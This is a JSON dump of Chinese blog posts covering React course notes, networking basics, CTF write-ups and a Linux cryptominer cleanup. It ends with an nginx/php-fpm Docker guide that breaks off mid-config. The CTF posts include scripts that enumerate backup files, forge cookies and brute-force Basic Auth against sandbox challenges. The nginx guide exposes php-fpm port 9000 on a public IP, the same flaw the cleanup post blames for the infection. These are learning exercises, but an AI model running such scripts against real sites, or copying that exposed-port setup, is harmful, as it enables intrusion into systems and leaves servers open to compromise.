[{"categories":["深入浅出现代Web编程 全栈公开课 2022"],"contents":"part 1 notes React 简介  开始需要node环境了，我这里是使用docker进行接下来的学习，这里顺带记录一下大致过程  pull node相关镜像，我这里 1  docker pull node:18-buster     然后启动一个容器： 1  docker run --name fullstack -p 3000:3000 -it fullstack /bin/bash    这里我还在内网暴露了3000端口（防火墙没开，被挖过一次矿之后开防火墙就十分谨慎了【悲】），但是后来发现利用vscode可以不通过公网访问在容器中临时部署的页面（vscode会弹窗提示，然后open即可）  回归主线，根据教程利用create-react-app工具制作一个简单的React应用： 1 2  cd /home/node # 下面这行代码会在当前目录生成文件夹，防止混乱cd到主目录 npx create-react-app part1    然后会开始安装不知道什么东西，不过很快报错permission denied，奇怪不知道为什么root身份下还会遇到权限问题，发现现在所在的目录/home/node拥有者是node，所以su node切一下身份，成功运行。 1 2  cd part1 npm start     接下来让修改文件，突然想起来vscode不能直接操作容器内的文件，但是众所周知vscode什么也能做，搜了一下，安装docker插件即可。  我这里是使用remote-ssh插件连接远程服务器操作的，安装插件的时候超级慢，又搜了一下，可以通过vscode网站的extensions页面下载vsix后缀的安装包，ftp传到服务器，vscode插件处右上角三个点的install from vsix安装即可  安装好后问题又来了，插件不能识别到容器和镜像（报错connect EACCES /var/run/docker.sock），搜索资料后是因为docker没权限（在此之前我的Ubuntu系统使用docker命令必须加sudo），需要将当前用户添加至docker用户组： 1 2 3  sudo groupadd docker sudo usermod -aG docker $USER newgrp docker    这时就可以发现能正常直接使用docker命令了，不需要sudo了，但是还是需要在控制台重启服务器，不然vscode还是报错（这里将vscode断开连接重连是不行的，需要在控制台将服务器重启） 简化代码： 对于/src/index.js： 1 2 3 4 5 6  import React from \u0026#39;react\u0026#39; import ReactDOM from \u0026#39;react-dom/client\u0026#39; import App from \u0026#39;./App\u0026#39; ReactDOM.createRoot(document.getElementById(\u0026#39;root\u0026#39;)).render(\u0026lt;App /\u0026gt;)   对于App.js： 1 2 3 4 5 6 7  const App = () =\u0026gt; ( \u0026lt;div\u0026gt; \u0026lt;p\u0026gt;Hello world\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; ) export default App   删除 App.css, App.test.js, index.css, logo.svg, setupTests.js 和 reportWebVitals.js 文件 Component App.js现在定义了一个名为App的React组件: 1  ReactDOM.createRoot(document.getElementById(\u0026#39;root\u0026#39;)).render(\u0026lt;App /\u0026gt;)   将该组件内容渲染到div-元素中，该元素在public/index.html中定义 再来看一下定义组件的代码： 1 2 3 4 5  const App = () =\u0026gt; ( \u0026lt;div\u0026gt; \u0026lt;p\u0026gt;Hello world\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; )   它被渲染成一个div-标签，包裹着一个p-标签 该组件被定义为一个JavaScript函数： 1 2 3 4 5  () =\u0026gt; ( \u0026lt;div\u0026gt; \u0026lt;p\u0026gt;Hello world\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; )   然后这个函数被分配给一个常量变量App 有几种方法可以在JavaScript中定义函数，这里使用的是箭头函数，在较新的JavaScript版本中被描述为ECMAScript 6，也称为ES6 这里用了简写： 1 2  (param1, param2, …, paramN) =\u0026gt; expression //相当于：(param1, param2, …, paramN) =\u0026gt;{ return expression; }    定义该组件的函数可以包含任意的js代码 1 2 3 4 5 6 7 8  const App = () =\u0026gt; { console.log(\u0026#39;Hello from component\u0026#39;) return ( \u0026lt;div\u0026gt; \u0026lt;p\u0026gt;Hello world\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; ) }   也可以在一个组件内渲染动态内容： 1 2 3 4 5 6 7 8 9 10 11 12 13 14  const App = () =\u0026gt; { const now = new Date() const a = 10 const b = 20 return ( \u0026lt;div\u0026gt; \u0026lt;p\u0026gt;Hello world, it is {now.toString()}\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; {a} plus {b} is {a + b} \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; ) }   大括号内的js代码会被计算，然后嵌入到组件产生的HTML中的定义位置 ","permalink":"https://WnQinm.github.io/2022/10/fullstackp1/","tags":["net"],"title":"part 1: React 入门"},{"categories":["深入浅出现代Web编程 全栈公开课 2022"],"contents":"课程相关 \u0026amp; part 0 notes 必要的说明 此笔记仅记录个人在学习过程中认为重要的内容，以及一些总结或心得，不代表课程实际内容，若要查看课程实际的全部内容，参见赫尔辛基大学推出的全栈公开课：深入浅出现代Web编程 全栈公开课 2022  本系列笔记是根据赫尔辛基大学推出的全栈公开课：深入浅出现代Web编程 全栈公开课 2022 所记，包括本笔记在内的所有收录于深入浅出现代Web编程 全栈公开课 2022的笔记的著作权及版权全归属于此课程官网所提及的人员或组织，具体内容如下，也可进入课程官网查看：  课程材料的0-8章节和第13章节是Matti Luukkainen 所写的。第9章节的内容是由来自Terveystalo的开发者所著。第10部分是由Kalle Ilves编写的。第11部分的内容由来自Smartly 的开发人员编写，第12部分由Jami Kousa 编写。很多开发者为了改进和修订课程材料做出了贡献，无论是课程内容还是拼写问题^_^。你也可以为这门课程的材料做出自己的贡献。这门课程的网站是由Houston inc设计和创建的，它们同样审阅了这门课程的内容。英文版是由Ava Heinonen, Ilkka Kuisma, Harri Mehtälä and Jesper Pettersson 翻译的。中文版是由ZhangWei(微信wechat:richardzhangv)翻译的。西班牙语是由Sebastian Torres 和 Cynthia Vico Vacca翻译的.  这门课程内容的版权在Creative Commons BY-NC-SA 3.0 license框架下执行。也就是说你可以自由的使用和分发课程材料，但要保留原作者信息，不能删除他们。如果你想要修改并分发修改后的版本，同样需要遵循这套协议。未经许可，禁止将该材料用于商业目的。  a 基础知识 先决条件 Prerequisites 说人话就是要求会基础编程，了解网络编程，了解数据库基本概念和操作语法，会git基本操作，能坚持下来 不需要对 JavaScript 或其他课程的主题有了解 Taking the course 最好学熟前一章在学下一章，记得做课后所有没有标记星号的练习题 Before you start 推荐使用Chrome或者火狐浏览器，网络开发工具很好。 记得安装Git，这里是网站推荐的git教程，我是在菜鸟教程和b站学习的。 安装支持Web开发的文本编辑器，推荐Visual Studio Code。 同时安装Node.js。教材使用的16.13.2版本，不要安装比这更早的版本。参见Node.js安装说明 b Web 应用的基础设施 传统的web应用 进入该页面时，浏览器从服务器上获取描述页面结构的HTML文档，以及文本内容。 服务器以某种方式生成了这个文档。该文档可以是一个保存在服务器目录中的静态文本文件。服务器也可以根据应用代码，例如使用数据库中的数据，动态地形成HTML文档。 类似如下示例代码： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  const getFrontPageHtml = (noteCount) =\u0026gt; { return(` \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#39;container\u0026#39;\u0026gt; \u0026lt;h1\u0026gt;Full stack example app\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;number of notes created ${noteCount}\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#39;/notes\u0026#39;\u0026gt;notes\u0026lt;/a\u0026gt; \u0026lt;img src=\u0026#39;kuva.png\u0026#39; width=\u0026#39;200\u0026#39; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; `) } app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { const page = getFrontPageHtml(notes.length) res.send(page) })   在传统的 web 应用中，浏览器是个“憨憨”。它只从服务器上获取HTML数据，而所有的应用逻辑都在服务器上。 这个例子使用了Node.js的Express。 Document Object Model or DOM 我们可以将 html 页面看作隐式树结构。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  html head link script body div h1 div ul li li li form input input   浏览器的工作，就是基于将HTML元素描绘成一棵树。 文档对象模型Document Object Model，或DOM，是一个应用编程接口(API)，它能够对与网页相对应的元素树进行程序化修改。 下面的代码为变量ul创建了一个新节点，并为其添加了一些子节点。 1 2 3 4 5 6 7 8  var ul = document.createElement(\u0026#39;ul\u0026#39;) data.forEach(function(note) { var li = document.createElement(\u0026#39;li\u0026#39;) ul.appendChild(li) li.appendChild(document.createTextNode(note.content)) })   最后，变量ul的树枝被连接到整个页面的HTML树中的适当位置。 1  document.getElementById(\u0026#39;notes\u0026#39;).appendChild(ul)   利用控制台操作文档对象 一个HTML文档的DOM树的最顶端节点被称为document对象。我们可以使用DOM-API在网页上执行各种操作。你可以通过在控制台标签中输入document来访问document对象。 从控制台向页面添加一个新的笔记 1 2 3 4 5 6 7 8 9  // 首先，我们要从页面上获得笔记的列表。列表在页面的第一个ul-元素中。 list = document.getElementsByTagName(\u0026#39;ul\u0026#39;)[0] // 然后创建一个新的li-元素，并在其中添加一些文本内容。 newElement = document.createElement(\u0026#39;li\u0026#39;) newElement.textContent = \u0026#39;Page manipulation from console is easy\u0026#39; // 然后将新的li-元素加入到列表中。 list.appendChild(newElement)   表单和HTTP POST方法 1 2 3 4 5  \u0026lt;!--form表单--\u0026gt; \u0026lt;form action=\u0026#34;/exampleapp/new_note\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;note\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Save\u0026#34;\u0026gt; \u0026lt;/form\u0026gt;   点击按钮提交表单后，提交了一个对new_note的post请求，然后被302重定向到了notes页面，重新加载notes页面使得我们又向浏览器要来了css、js、json文件 服务器上负责POST请求的代码： 1 2 3 4 5 6 7 8  app.post(\u0026#39;/new_note\u0026#39;, (req, res) =\u0026gt; { notes.push({ content: req.body.note, date: new Date(), }) return res.redirect(\u0026#39;/notes\u0026#39;) })   数据被作为POST请求的body发送。 服务器可以通过访问请求对象req的req.body字段来访问这些数据。 服务器创建一个新的Note对象，并将其添加到一个名为notes的数组中。 AJAX AJAX(Asynchronous JavaScript and XML)是2005年2月在浏览器技术进步的背景下引入的一个术语，用来描述一种新的革命性的方法，它能够使用包含在HTML中的JavaScript来获取网页内容，而不需要重新渲染网页。 单页应用 近年来，出现了创建网络应用的单页应用 (SPA)风格。SPA风格的网站并不像我们的样例应用那样从服务器上单独获取所有的页面，而是只由一个从服务器上获取的HTML页面组成，其内容由在浏览器中执行的JavaScript来操作。 我们应用的笔记页面与SPA风格的应用有一些相似之处，但还没有完全达到目的。尽管渲染笔记的逻辑是在浏览器上运行的，但该页面仍然使用传统的方式来添加新的笔记。数据通过表单提交被发送到服务器，服务器通过redirect指示浏览器重新加载笔记页面。 我们的例子应用的单页应用版本可以在https://studies.cs.helsinki.fi/exampleapp/spa找到。 乍看之下，这个应用与之前的应用完全一样。 HTML代码几乎相同，但JavaScript文件不同（spa.js），而且在定义form-tag的方式上有一点变化。 1 2 3 4  \u0026lt;form id=\u0026#34;notes_form\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;note\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Save\u0026#34;\u0026gt; \u0026lt;/form\u0026gt;   这个表单没有action或method属性来定义如何和往哪里发送输入数据。 当按下按钮提交时可以发现浏览器只发送了一个请求 服务器以状态代码201创建进行响应。这一次服务器没有要求重定向，浏览器停留在同一个页面上，并且没有再发送HTTP请求。 应用的SPA版本没有以传统方式发送表单数据，而是使用了它从服务器上获取的JavaScript代码。 1 2 3 4 5 6 7 8 9 10 11 12 13 14  var form = document.getElementById(\u0026#39;notes_form\u0026#39;) form.onsubmit = function(e) { e.preventDefault() var note = { content: e.target.elements[0].value, date: new Date(), } notes.push(note) e.target.elements[0].value = \u0026#39;\u0026#39; redrawNotes() sendToServer(note) }   命令document.getElementById('notes_form')指示代码从页面上获取表单元素，并注册一个事件处理程序来处理表单提交事件。该事件处理程序立即调用方法e.preventDefault()来阻止表单提交的默认处理。默认方法会将数据发送到服务器并导致一个新的GET请求，这是我们不希望发生的。 然后事件处理函数创建了一个新的笔记，用notes.push(note)命令将其添加到笔记列表中，重新渲染页面上的笔记列表，并将新笔记发送到服务器。 1 2 3 4 5 6 7 8 9 10  var sendToServer = function(note) { var xhttpForPost = new XMLHttpRequest() // ...  xhttpForPost.open(\u0026#39;POST\u0026#39;, \u0026#39;/new_note_spa\u0026#39;, true) xhttpForPost.setRequestHeader( \u0026#39;Content-type\u0026#39;, \u0026#39;application/json\u0026#39; ) xhttpForPost.send(JSON.stringify(note)) }   该代码确定数据将以HTTP POST请求发送，数据类型为JSON。数据类型由Content-type头决定。然后，数据被作为JSON-字符串发送。 ","permalink":"https://WnQinm.github.io/2022/10/fullstackp0/","tags":["net"],"title":"part 0: Web 应用的基础设施"},{"categories":["ctf"],"contents":"备份文件下载 网站源码 题目 当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。 日常url 解题过程 打开网址后得到了一些提示：  常见的网站源码备份文件后缀: tar, tar.gz, zip, rar 常见的网站源码备份文件名: web, website, backup, back, www, wwwroot, temp  写代码遍历一下目录下有木有类似的备份文档: 1 2 3 4 5 6 7 8 9 10 11 12  import requests url = \u0026#34;http://challenge-e6f8bdc6cd89dde1.sandbox.ctfhub.com:10800/\u0026#34; suffix_list = [\u0026#39;tar\u0026#39;, \u0026#39;tar.gz\u0026#39;, \u0026#39;zip\u0026#39;, \u0026#39;rar\u0026#39;] name_list = [\u0026#39;web\u0026#39;, \u0026#39;website\u0026#39;, \u0026#39;backup\u0026#39;, \u0026#39;back\u0026#39;, \u0026#39;www\u0026#39;, \u0026#39;wwwroot\u0026#39;, \u0026#39;temp\u0026#39;] for suffix in suffix_list: for name in name_list: fullname = f\u0026#39;{name}.{suffix}\u0026#39; fullurl = url + fullname req = requests.get(fullurl) if req.status_code != 404: print(fullurl)   得到文件名后访问下载，得到网站备份和一个名为flag的txt文件，但是打开文件被调戏了一番：where is flag ?? 既然是网站备份，那就在现运行网站访问一下这个txt文件，最后得到flag bak文件 题目 当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。 解题过程 打开所给的url，提示：Flag in index.php source code. 进入url/index.php提示依旧如上，根据题目进入url/index.php.bak 得到flag 注：通过dirsearch可以遍历web目录： dirsearch -u [url] -e *(kali) 或 python3 dirsearch.py -u [url] -e * vim缓存 题目 当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。 解题过程 打开网址，提示：flag 在 index.php 源码中 由题目提示，根据多次用vim不小心异常退出生成备份文件的经验依稀记得是生成类似：[filename].swp 的文件 使用 dirsearch -u [url] -e * | grep index.php 查找，果然有一个 .index.php.swp文件，下载下来之后得到了flag（在很多空格之后的最末尾，差点以为没有） .DS_Store 题目 .DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。 解题过程 打开网址，根据题目提示下载这个隐藏文件 得到：$ 9 5 8 b 9 9 e f 0 6 0 6 4 f 9 1 c 0 8 d c e c 5 6 d 8 1 3 c c a . t x tnoteustr f l a g h e r e ! 访问：[url]/958...cca.txt得到flag ","permalink":"https://WnQinm.github.io/2022/10/data_expose/","tags":["net"],"title":"信息泄露"},{"categories":["CTF"],"contents":"CTFHUB技能树的题目 web-web前置技能-http协议  请求方式 题目 HTTP 请求方法, HTTP/1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。 还给了一个url 解题过程 打开url后，显示如下：  HTTP Method is GET Use CTF**B Method, I will give you flag. Hint: If you got 「HTTP Method Not Allowed」 Error, you should request index.php.  发现是要用CTFHUB这个方法请求这个url 用py写如下代码： 1 2 3 4 5  from urllib import request req = request.Request(method=\u0026#39;CTFHUB\u0026#39;, url=\u0026#39;http://challenge-7c8a21f5ac0bee47.sandbox.ctfhub.com:10080/index.php\u0026#39;) res = request.urlopen(req) print(res.read())   返回了html文档，其中便有flag 302跳转 题目 HTTP临时重定向 依旧给了个url 解题过程 访问url，显示： 1 2 3 4 5 6  \u0026lt;body\u0026gt; \u0026lt;center\u0026gt; \u0026lt;h1\u0026gt;No Flag here!\u0026lt;/h1\u0026gt; \u0026lt;a href=\u0026#34;index.php\u0026#34;\u0026gt;Give me Flag\u0026lt;/a\u0026gt; \u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt;   chrome抓包发现对index.php的请求302到了index.html~ 利用python访问url并禁止跳转 1 2 3 4 5  import requests url = \u0026#34;http://challenge-2d971fb5ad995d8f.sandbox.ctfhub.com:10800/index.php\u0026#34; req = requests.get(url=url, allow_redirects=False) print(req.text)   Cookie 题目 Cookie欺骗、认证、伪造 以及url 解题过程 访问url，提示：  hello guest. only admin can get flag.  查看请求头，发现Cookie: admin:0,故而应该是请求时传入cookies 1 2 3 4 5  import requests url = \u0026#34;http://challenge-1ff467c75ff8e3e2.sandbox.ctfhub.com:10800\u0026#34; req = requests.get(url=url, cookies={\u0026#39;admin\u0026#39;:\u0026#39;1\u0026#39;}) print(req.text)   即可获得flag 基础认证 题目 在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。详情请查看 https://zh.wikipedia.org/wiki/HTTP基本认证 常规给出url 一个录有100个密码的密码本 解题过程 通过终端curl -v [url]得到： www-authenticate 那一行提示到用户名可能是 admin 写一个py遍历一下密码本： 1 2 3 4 5 6 7 8 9 10 11 12 13  import requests url = \u0026#34;http://challenge-153f9b191245ba0f.sandbox.ctfhub.com:10800/flag.html\u0026#34; while (1): with open(\u0026#34;10_million_password_list_top_100.txt\u0026#34;, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: for pwd in f.readlines(): print(pwd.strip()) req = requests.get(url, auth=(\u0026#39;admin\u0026#39;, pwd.strip())) if req.status_code != 401: print(req.text) break break   得到flag ","permalink":"https://WnQinm.github.io/2022/10/http_base/","tags":["net"],"title":"ctf入门-http基础"},{"categories":["web基础知识"],"contents":"计算机网络基础知识总结:) 网络层次划分  为了使不同计算机厂家的计算机能够相互通信，以便在更大范围内建立计算机网络，国际标准化组织（ISO）在1978年提出了“开放系统互联参考模型”，即著名的OSI/RM模型（Open System Interconnection/Reference Model）。他将计算机网络体系结构的通信协议划分为七层，自下而上依次为：物理层（Physics Layer）、数据链路层（Data Link Layer）、网络层（Network Layer）、传输层（Transport Layer）、会话层（Session Layer）、表示层（Presentation Layer）、应用层（Application Layer）。其中第四次完成数据传送服务，上面三层面向用户。  除了标准的OSI七层模型以外，常见的网络层次划分还有TCP/IP四层协议以及TCP/IP五层协议，他们之间的对应关系如下图所示：  七层网络模型 TCP/IP协议毫无疑问是互联网的基础协议，没有它就根本不可能上网，任何和互联网有关的操作都离不开TCP/IP协议。不管是OSI七层模型还是TCP/IP的四层、五层模型，每一层中都要有自己的专属协议，完成自己相应的工作以及与上下层级之间进行沟通。由于OSI七层模型为网络的标准层次划分，所以我们以OSI七层模型为例从下向上进行一一介绍。  物理层（Physical Layer）  激活、维持、关闭通信端点之间的机械特性、电气特性、功能特性以及过程特性。**该层为上层协议提供了一个传输数据的可靠的物理媒体。简单的说，物理层确保院士的数据可在各种物理媒体上传输。**物理层记住两个重要的设备名称，中继器（Repeater,也叫放大器）和集线器。 数据链路层（Data Link Layer）  数据链路层在物理层提供的服务的基础上向网络层提供服务，其最基本的服务时将源自网络层的数据可靠地传输到相邻节点的目标机网络层。为达到这一目的，数据链路必须具备一系列相应的功能，主要有：如何将数据组合成数据块，在数据链路层中称这种数据块为帧（frame），帧是数据链路层的传输单位；如何控制帧在物理信道上的传输，包括如何处理传输差错，如何调节发送速率以使与接收方匹配；以及在两个网络实体之间提供数据链路通路的建立、维持和释放的管理。数据链路层在不可靠的物理介质上提供可靠的传输。该层的作用包括：物理地址寻址、数据的成帧、流量控制、数据的检错、重发等。  有关数据链路层的重要知识点：  数据链路层为网络层提供可靠的数据传输  基本数据单位为帧  主要的协议：以太网协议  两个重要设备名称：网桥和交换机   网络层（Network Layer）  网络层的目的是实现两个端系统之间的数据透明传送，具体功能包括寻址和路由选择、连接的建立、保持和终止等。它提供的服务使传输层不需要了解网络中的数据传输和交换技术。如果想用尽量少的词来记住网络层，那就是“路径选择、路由及逻辑寻址”。  网络层中涉及众多的协议，其中包括最重要的协议，也是TCP/IP的核心协议——IP协议。IP协议非常简单，仅仅提供不可靠、无连接的传送服务。IP协议的主要功能有：无连接数据报传输、数据报路由选择和差错控制。与IP协议配套使用实现其功能的还有地址解析协议ARP、逆地址解析协议RARP、因特网报文协议ICMP、因特网组管理协议IGMP。具体的协议我们会在接下来的部分进行总结。  有关网络层的重点为：  网络层负责对子网间的数据包进行路由选择。此外，网络层还可以实现拥塞控制、网际互连等功能 基本数据单位为IP数据报 包含的主要协议： IP协议（Internet Protocol，因特网互联协议） ICMP协议（Internet Control Message Protocol，因特网控制报文协议） ARP协议（Address Resolution Protocol，地址解析协议） BARP协议（Reverse Address Resolution Protocol，你地址解析协议） 重要的设备：路由器   传输层（Transport Layer）  第一个端到端，即主机到主机的层次。传输层负责将上层数据分段并提供端到端的、可靠的或不可靠的传输。此外，传输层还要处理端到端的差错控制和流量控制问题。  传输层的任务是根据通信子网的特性，最佳的利用网络资源，为两个端系统好会话层之间，提供建立、维护和取消传输连接的功能，负责端到端的可靠数据传输。在这一次，信息传送的协议数据单元成为段或报文。  网络层知识根据网络地址将源结点发出的数据包传送到目的结点，而传输层则负责将数据可靠地传送到相应的端口。  有关传输层的重点 1. 传输层负责将上层数据分段并提供端到端的、可靠的或不可靠的传输以及端到端的差错控制和流量控制问题 2. 包含的主要协议： TCP协议（Transmission Control Protocol，传输控制协议） UDP协议（User Datagram Protocol，用户数据报协议） 3. 重要设备：网关  会话层  会话层管理主机之间的会话进程，即负责建立、管理、终止进程之间的会话。会话层还利用在数据中插入校验点来实现数据的同步。 表示层  表示层对上层数据或信息进行变换以保证一个主机应用层信息可以被另一个主机的应用程序理解。表示层的数据转换包括数据的加密、压缩、格式转换等。 应用层  为操作系统或网络应用程序提供访问网络服务的接口。  会话层、表示层和应用层重点： 1. 数据传输基本单位为报文 2.包含的主要协议： FTP（文件传送协议）、Telnet（远程登录协议）、DNS（域名解析协议）、SMTP（邮件传送协议）、POP3协议（邮局协议）、HTTP协议（Hyper Text Transfer Protocol）。  IP地址 网络地址  IP地址由网络号（包括子网号）和主机号组成，网络地址的主机号为全0，网络地址代表着整个网络。网络号长度有八位、十六位、二十四位，即ip地址最后的/8,/16,/24。  譬如192.168.0.0/16，前16位是网络号，是定死的；后16位是主机号，用于给每个主机分配的。 广播地址  广播地址通常称为直接广播地址，是为了区分受限广播地址。  广播地址与网络地址的主机号正好相反，广播地址中，主机号为全1.当向某个网络的广播地址发送消息时，该网络内的所有主机都能收到该广播消息。 组播地址 D类地址就是组播地址 A、B、C、D类地址：  A类地址以0开头，第一个字节作为网络号，地址范围为：0.0.0.0~127.255.255.255;  B类地址以10开头，前两个字节作为网络号，地址范围是：128.0.0.0~191.255.255.255;  C类地址以110开头，前三个字节作为网络号，地址范围是：192.0.0.0~233.255.255.255;  D类地址以1110开头，地址范围是224.0.0.0~239.255.255.255，D类地址作为组播地址（一对多的通信）;  E类地址以1111开头，地址范围是240.0.0.0~255.255.255.255，E类地址为保留地址，供以后使用  注：只有A,B,C有网络号和主机号之分，D类地址和E类地址没有划分网络号和主机号。 255.255.255.255  该IP地址指的是受限的广播地址。受限广播地址与一般广播地址（直接广播地址）的区别在于，受限广播地址只能用于本地网络，路由器不会转发以受限广播地址为目的地址的分组；一般广播地址既可在本地广播，也可夸网段广播。例如：主机192.168.1.1/30上的直接广播数据报后，另外一个网段192.168.1.5/30也能收到该数据报；若发送受限广播数据报，则不能收到。  注：一般的广播地址（直接广播地址）能够通过某些路由器（当然不是所有的路由器），而受限的广播地址不能通过路由器。 0.0.0.0  常用于寻找自己的IP地址，例如在我们的RARP，BOOTP和DHCP协议中，若某个未知IP地址的无盘机想要知道自己的IP地址，他就以255.255.255.255为目的地址，向本地范围（具体而言是被各个路由器屏蔽的范围内）的服务器发送IP请求分组。 回环地址  127.0.0.0/8被用作回环地址，回环地址表示本机的地址，常用于对本机的测试，用的最多的是127.0.0.1 A、B、C类私有地址  私有地址(private address)也叫专用地址，它们不会在全球使用，只具有本地意义。  A类私有地址：10.0.0.0/8，范围是：10.0.0.0~10.255.255.255  B类私有地址：172.16.0.0/12，范围是：172.16.0.0~172.31.255.255  C类私有地址：192.168.0.0/16，范围是：192.168.0.0~192.168.255.255 子网掩码及网络划分  随着互联网应用的不断扩大，原先的IPv4的弊端也逐渐暴露出来，即网络号占位太多，而主机号位太少，所以其能提供的主机地址也越来越稀缺，目前除了使用的NAT在企业内部利用保留地址自行分配以外，通常都对一个高类别的IP地址进行再划分，以形成多个子网，提供给不同规模的用户群使用。  这里主要是为了在网络分段情况下有效地利用IP地址，通过对主机号的高位部分取作子网号，从通常的网络位界限中扩展或压缩子网编码， ","permalink":"https://WnQinm.github.io/2022/10/computer_net/","tags":["net"],"title":"计算机网络"},{"categories":["Hack"],"contents":"docker安装php并对外开放9000端口极易被攻击！ 简要描述 连续两天出现阿里云和腾讯云提示恶意脚本运行和挖矿软件，都是在开启php的docker容器之后发生的，不过网上大部分同时关于docker和kdevtmpfsi的文章都是在说是docker-redis的原因，一时没有找到比较符合我这里情况的被入侵原因，今天突然无意间看到了符合我情况的解释 解决过程简述 杀死进程 1 2 3 4 5  # 找到病毒进程 ps -aux | grep kinsing ps -aux | grep kdevtmpfsi # 结束进程 sudo kill -9 pid   删除文件和定时任务 1 2 3 4 5 6 7 8  # 寻找文件位置 su # 登录root find / | grep kinsing find / | grep kdevtmpfsi rm -rf ... # 删除搜索到的文件 cd /var/spool/cron/crontabs # 查找定时任务 rm -rf ... # 删除可疑任务   漏洞原因 php-fpm fastcgi漏洞，资料如下：  https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html  大意是：开放了9000端口，按照一定的代码格式，来请求php代码，进入fastcgi里面，就可以执行自己任意的php代码 关闭9000端口，使用docker网桥连接nginx和php容器，docker network inspect bridge查看php的内网ip，nginx的default.conf文件中关于php的设置，直接访问ip:9000即可 总结 处理恶意程序的大致方法如下：   杀死挖矿程序进程（注意先kill守护进程）   查看定时任务，有无可疑程序   删除相关文件，重新新建文件，然后设置权限   观察，查看log 不必要的端口不要暴露出来  ","permalink":"https://WnQinm.github.io/2022/10/kdevtmpfsi/","tags":["virus","net"],"title":"处理linux病毒'kinsing''kdevtmpfsi'"},{"categories":["Docker"],"contents":"主页需要用到php文件，所以研究了一下nginx配置php 我这里使用docker安装php  这里必须要吐槽一下，百度ubuntu安装php，99%都是要yum install php，我搞了半天怎么安装yum（apt install yum提示找不到package，更换了源还是一样），安装yum行不通。 发现似乎可以直接apt install php，就直接莽了apt install php php-fpm，最后不知道为什么php-fpm找不到，运行不起来，回头看安装提示爆了一堆错，只好卸载php。安装的时候装了不知道多少兆，最后删的时候只删了目测一兆两兆！只好whereis php查询出来一个一个删。。。 肯定删不干净qwq，气死我了气死我了气死我了 新学了一招 sudo apt-get autoremove php卸载很干净，能卸载依赖  正文开始： docker pull php:7.4-fpm拉取镜像，至于为啥不拉取最新的我也不知道，我翻了好几篇文章都是安装指定版本，这里选了一个他们之中最新的 sudo docker run --name php -v /home/nginx/html:/www -d -p 9000:9000 php:7.4-fpm这里是重点 首先记得防火墙开9000端口，其次我将/home/nginx/html映射到了php容器中的/www文件，其中/home/nginx是我nginx在宿主机的文件映射地址，详情见我的nginx文章，这里的html文件夹用来放置网站的html文件，其在nginx容器中对应地址是/usr/share/nginx/html。 找到nginx容器的default.conf文件，添加以下东东 1 2 3 4 5 6 7 8 9 10  location ~ \\.php$ { root /www; fastcgi_pass 服务器公网ip:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /www/$fastcgi_script_name; include fastcgi_params; } # 第二行根目录存放的是php文件，这里与nginx存放html文件的文件夹映射到了宿主机同一文件夹下 # 第三行填服务器或者你的电脑的公网ip地址，这里注意需要把nginx和php放到同一docker network下，不然可能会发生不好的事情 # 第五行/www/这里也是存php文件的那个目录，具体啥意思我也不没看懂，详情见菜鸟教程相关说明   现在，如果你在宿主机的html目录下放置了php文件，就能通过:服务器ip/file.php访问了！ 随文附上我的nginx配置文件default.conf: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77  # code-server二级域名配置 server { listen 80; server_name xxx; location / { proxy_pass http://ip:xxxx/; proxy_set_header Host $host; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection upgrade; proxy_set_header Accept-Encoding gzip; } } # http转https server{ listen 80; listen [::]:80; server_name xxx; return 301 https://$host$request_uri; } # https配置 server { listen 443 ssl; server_name xxx; #access_log /var/log/nginx/host.access.log main; ssl_certificate /etc/nginx/conf.d/cert/xxx_bundle.pem; ssl_certificate_key /etc/nginx/conf.d/cert/xxx.key; ssl_session_timeout 5m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; ssl_prefer_server_ciphers on; # 此处便是域名根目录地址，即前文所说的html文件储存地址 location / { root /usr/share/nginx/html; index index.html index.htm; } #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html { root 